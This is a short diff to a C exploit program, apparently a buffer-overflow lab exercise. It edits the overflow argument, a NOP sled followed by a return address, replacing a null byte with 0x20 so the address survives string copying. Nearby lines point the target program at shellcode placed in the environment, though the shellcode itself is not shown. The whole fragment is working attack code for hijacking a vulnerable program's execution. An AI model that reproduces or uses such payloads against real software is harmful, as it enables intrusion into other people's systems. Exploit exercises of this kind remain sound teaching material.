@@ -14,7 +14,7 @@ int main(void)
   
   args[0] = TARGET;
   //Start of buffer
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x00\xd7\xff\xff";
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x20\xd7\xff\xff";
   args[2] = NULL;
   
   env[0] = shellcode;
